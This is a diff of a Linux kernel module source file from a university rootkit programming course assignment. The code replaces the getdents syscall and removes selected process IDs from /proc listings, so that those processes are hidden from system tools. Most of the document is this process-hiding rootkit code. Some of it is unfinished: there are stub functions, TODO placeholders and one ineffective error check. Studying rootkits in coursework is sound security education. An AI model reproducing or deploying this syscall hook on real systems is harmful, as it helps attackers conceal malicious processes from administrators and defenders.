@@ -4,9 +4,9 @@
 /*   Course: Rootkit Programming                                               */
 /*   Semester: WS 2015/16                                                      */
 /*   Team: 105                                                                 */
-/*   Assignment: 3                                                             */
+/*   Assignment: 7                                                             */
 /*                                                                             */
-/*   Filename: process_masker.c                                                */
+/*   Filename: process_masking.c                                               */
 /*                                                                             */
 /*   Authors:                                                                  */
 /*       Name: Matei Pavaluca                                                  */
@@ -15,19 +15,90 @@
 /*       Name: Nedko Stefanov Nedkov                                           */
 /*       Email: nedko.stefanov.nedkov@gmail.com                                */
 /*                                                                             */
-/*   Date: November 2015                                                       */
+/*   Date: December 2015                                                       */
 /*                                                                             */
 /*   Usage:                                                                    */
 /*                                                                             */
 /*******************************************************************************/
 
-#include <linux/module.h>		/* Needed by all kernel modules */
 #include <linux/syscalls.h>		/* Needed for __NR_getdents */
 #include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
-#include <linux/ctype.h>
-#include <linux/slab.h>
 
-#include "process_masking.h"
+
+/*******************************************************************************/
+/*                                                                             */
+/*                       DEFINITIONS - DECLARATIONS                            */
+/*                                                                             */
+/*******************************************************************************/
+
+
+/* Definition of macros */
+#define PRINT(str) printk(KERN_INFO "rootkit process_masking: %s\n", (str))
+#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
+#define PRINT_PID(pid) printk(KERN_INFO "rootkit process_masking: masking process %d\n", (pid))
+#define DEBUG_PRINT_PID(pid) if (show_debug_messages) PRINT_PID(pid)
+#define PIDS_BUFFSIZE 8   //TODO: to be deleted
+
+
+/* Definition of data structs */
+struct linux_dirent {
+	long d_ino;
+	off_t d_off;
+	unsigned short d_reclen;
+	char d_name[];
+};
+
+
+/* Definition of global variables */
+static int show_debug_messages;
+static unsigned long proc_ino;
+asmlinkage int (*getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);   //TODO: should point to original_getdents
+static int pids[PIDS_BUFFSIZE];   //TODO: to be deleted
+static int pids_count;   //TODO: to be deleted
+
+
+/* Declaration of functions */
+static int process_masking_init(int);
+static int process_masking_exit(void);
+
+
+asmlinkage int my_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
+
+static void mask_process(pid_t);
+static void unmask_process(pid_t);
+
+static unsigned long get_inode_no(char *);
+static int should_mask(pid_t);
+
+
+/*******************************************************************************/
+/*                                                                             */
+/*                                  CODE                                       */
+/*                                                                             */
+/*******************************************************************************/
+
+
+/* Initialization function */
+static int process_masking_init(int debug_mode_on)
+{
+	show_debug_messages = debug_mode_on;
+
+	proc_ino = get_inode_no("/proc");
+	if (proc_ino < 0)
+		return 1;
+
+	DEBUG_PRINT("initialized");
+
+	return 0;
+}
+
+
+static int process_masking_exit(void)
+{
+	DEBUG_PRINT("exited");
+
+	return 0;
+}
 
 
 /* Function that replaces the original getdents syscall. In addition to what
@@ -40,7 +111,7 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 	char *endptr;
 
 	/* Call original getdents_syscall */
-	nread = original_getdents_syscall(fd, dirp, count);
+	nread = getdents_syscall(fd, dirp, count);
 
 	if (dirp->d_ino != proc_ino)
 		return nread;
@@ -51,8 +122,8 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 		nread_temp -= dirp->d_reclen;
 
 		pid = simple_strtol(dirp->d_name, &endptr, 10);
-		if (pid && process_is_hidden(pid)) {
-			printk(KERN_INFO "process_masker rootkit: hiding PID %d\n", pid);
+		if (pid && should_mask(pid)) {
+			DEBUG_PRINT_PID(pid);
 			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
 			nread -= dirp->d_reclen;
 			continue;
@@ -68,8 +139,20 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 }
 
 
+static void mask_process(pid_t pid)
+{
+	//TODO: to be implemented
+}
+
+
+static void unmask_process(pid_t pid)
+{
+	//TODO: to be implemented
+}
+
+
 /* Function that gets the inode number of the file found under specified path */
-unsigned long get_inode_no(char *path_name)
+static unsigned long get_inode_no(char *path_name)
 {
 	unsigned long inode_no;
 	struct path path;
@@ -85,48 +168,16 @@ unsigned long get_inode_no(char *path_name)
 }
 
 
-int process_is_hidden(int pid)
+/* Function that checks whether we need to mask the specified pid */
+//TODO: to be updated
+static int should_mask(pid_t pid)
 {
-	struct process *cur;
-	struct list_head *cursor;
+	int i;
 
-	list_for_each(cursor, &processes) {
-		cur = list_entry(cursor, struct process, list);
-		if (cur->pid == pid)
+	for (i=0 ; i<pids_count ; i++)
+		if (pids[i] == pid)
 			return 1;
-	}
 
 	return 0;
-}
-
-void mask_process(int pid)
-{
-	struct process *new;
-	
-	if (process_is_hidden(pid)) {
-		return;
-	}
-
-	new = kmalloc(sizeof(struct process), GFP_KERNEL);
-	if (new == NULL)
-		return;
-	
-	new->pid = pid;
-	list_add(&new->list, &processes);	
-}
-
-void unmask_process(int pid)
-{
-	struct process *cur;
-	struct list_head *cursor, *next;
-
-	list_for_each_safe(cursor, next, &processes) {
-		cur = list_entry(cursor, struct process, list);
-		if(cur->pid == pid) {
-			list_del(cursor);
-			kfree(cur);
-			return;
-		}
-	}
 }
 
